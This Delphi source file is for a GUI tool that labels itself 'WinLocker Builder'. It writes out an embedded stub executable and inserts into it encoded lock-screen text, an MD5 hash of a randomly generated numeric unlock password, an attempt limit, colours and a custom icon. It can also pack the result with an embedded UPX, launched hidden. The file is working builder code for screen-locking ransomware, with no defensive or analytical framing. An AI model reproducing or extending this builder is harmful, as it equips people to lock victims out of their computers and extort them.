unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, umd5, ExtCtrls, EncdDecd, ShellAPI, IconChangerUnit;

type
  TForm1 = class(TForm)
    Label1: TLabel;
    GroupBox1: TGroupBox;
    Edit1: TEdit;
    Memo1: TMemo;
    GroupBox2: TGroupBox;
    Edit2: TEdit;
    Button1: TButton;
    GroupBox3: TGroupBox;
    Edit3: TEdit;
    GroupBox4: TGroupBox;
    GroupBox5: TGroupBox;
    ComboBox1: TComboBox;
    ComboBox2: TComboBox;
    CheckBox1: TCheckBox;
    Button2: TButton;
    SaveDialog1: TSaveDialog;
    OpenDialog1: TOpenDialog;
    Timer1: TTimer;
    GroupBox6: TGroupBox;
    Button3: TButton;
    Label2: TLabel;
    Shape1: TShape;
    Image1: TImage;
    procedure Button1Click(Sender: TObject);
    procedure ComboBox1KeyPress(Sender: TObject; var Key: Char);
    procedure ComboBox2KeyPress(Sender: TObject; var Key: Char);
    procedure Button2Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Edit3KeyPress(Sender: TObject; var Key: Char);
    procedure Button3Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  path: string;

implementation

{$R *.dfm}
{$R upx.RES}
{$R STUB.RES}

procedure ExtractRes(ResType, ResName, ResNewName: string);
var
  Res: TResourceStream;
begin
try
  Res := TResourceStream.Create(Hinstance, Resname, Pchar(ResType));
  Res.SavetoFile(ResNewName);
  Res.Free;
except
end;
end;

procedure InsertRes(FilePath: string; TRes: LPTSTR; NameRes, Res: string);
var
  hRes: THANDLE;
begin
SetErrorMode(SEM_NOGPFAULTERRORBOX);
try
  hRes := BeginUpdateResource(PChar(FilePath), False);
  UpdateResource(hRes, TRes, PChar(NameRes), LANG_SYSTEM_DEFAULT, @Res[1], Length(Res));
  EndUpdateResource(hRes, False);
except
end;
end;

function GetTempDir: String;
var
tempFolder: array[0..MAX_PATH] of Char;
begin
GetTempPath(MAX_PATH, @tempFolder);
result := StrPas(tempFolder);
end;

procedure TForm1.Button1Click(Sender: TObject);
var
  i: integer;
begin
  Edit2.text := '';
  randomize;
  for i := 1 to 11 do
  begin
    Edit2.text := Edit2.text + chr(random($0A) + $30);
  end;
end;

procedure TForm1.ComboBox1KeyPress(Sender: TObject; var Key: Char);
begin
Key := #0;
end;

procedure TForm1.ComboBox2KeyPress(Sender: TObject; var Key: Char);
begin
Key := #0;
end;

procedure TForm1.Button2Click(Sender: TObject);
var
password, attempts, text, memotext, bgcol, textcol: string;
begin
if (Length(Memo1.text) = 0) or (Edit1.Text = '') or (Edit3.Text = '') then
begin
  MessageBox(0, 'Какое-то поле не заполнено', 'Ошибка', MB_ICONERROR);
  exit;
end;

if ComboBox1.Text = ComboBox2.Text then
begin
  MessageBox(0, 'Нельзя использовать 2 одинаковых цвета для цвета фона и текста', 'Ошибка', MB_ICONERROR);
  exit;
end;

if (Edit3.Text = '') or (StrToInt(Edit3.Text) <= 0) then
begin
MessageBox(0, 'Некорректное значение попыток ввода пароля', 'Ошибка', MB_ICONERROR);
exit;
end;

if not SaveDialog1.Execute then Exit;
ExtractRes('EXEFILE', 'STUB', SaveDialog1.FileName);

if OpenDialog1.FileName <> '' then
    if ChangeExeIcon(PChar(Savedialog1.FileName), 'ICON', OpenDialog1.Filename) then begin end;

if FileExists(GetTempDir + '\upx.exe') then
begin
DeleteFile(GetTempDir + '\upx.exe');
end;


text := Edit1.text;
text := EncodeString(text);

memotext := Memo1.Text;
memotext := EncodeString(memotext);

password := Edit2.Text;
password := md5(password);

attempts := Edit3.Text;
if Length(attempts) > 9 then
begin
  while Length(attempts) > 9 do
  begin
      Delete(attempts, Length(attempts), 1);
    end;
end;
attempts := EncodeString(attempts);

bgcol := ComboBox1.Text;
bgcol := EncodeString(bgcol);

textcol := ComboBox2.Text;
textcol := EncodeString(textcol);

InsertRes(Savedialog1.FileName, RT_RCDATA, 'txt', text);
InsertRes(Savedialog1.FileName, RT_RCDATA, 'memo', memotext);
InsertRes(Savedialog1.FileName, RT_RCDATA, 'pwd', password);
InsertRes(Savedialog1.FileName, RT_RCDATA, 'atts', attempts);
InsertRes(Savedialog1.FileName, RT_RCDATA, 'bgcol', bgcol);
InsertRes(Savedialog1.FileName, RT_RCDATA, 'txtcol', textcol);
Sleep(100);
  if CheckBox1.Checked then begin
  path := ExtractFileName(SaveDialog1.FileName);
  ExtractRes('EXEFILE', 'FILE3', GetTempDir+'upx.exe');
  ShellExecute(0,'open',pchar(GetTempDir+'upx.exe'),pchar(path),pchar(GetCurrentDir+'\'),SW_HIDE);
  Sleep(1000);
  end;
MessageBox(0, 'Билд собран', 'WinLocker Builder', MB_ICONINFORMATION);
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
  i: Integer;
begin
  // Loop through the characters in the TEdit control
  for i := 1 to Length(Edit3.Text) do
  begin
    // Check if the character is non-numeric
    if not (Edit3.Text[i] in ['0'..'9']) then
    begin
      // If it is non-numeric, remove it from the text
      Edit3.Text := Copy(Edit3.Text, 1, i - 1) + Copy(Edit3.Text, i + 1, Length(Edit3.Text) - i);
      // Exit the loop after removing one non-numeric character per iteration
      Exit;
    end;
  end;
end;

procedure TForm1.Edit3KeyPress(Sender: TObject; var Key: Char);
begin
if Length(Edit3.Text) > 9 then
  begin
    Key := #0;
  end;

  if not ((Key in ['0'..'9']) or (Key = #8) or (Key = #13)) then Key := #0;
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
if OpenDialog1.Execute then
    Image1.Picture.LoadFromFile(Opendialog1.FileName);
end;

end.
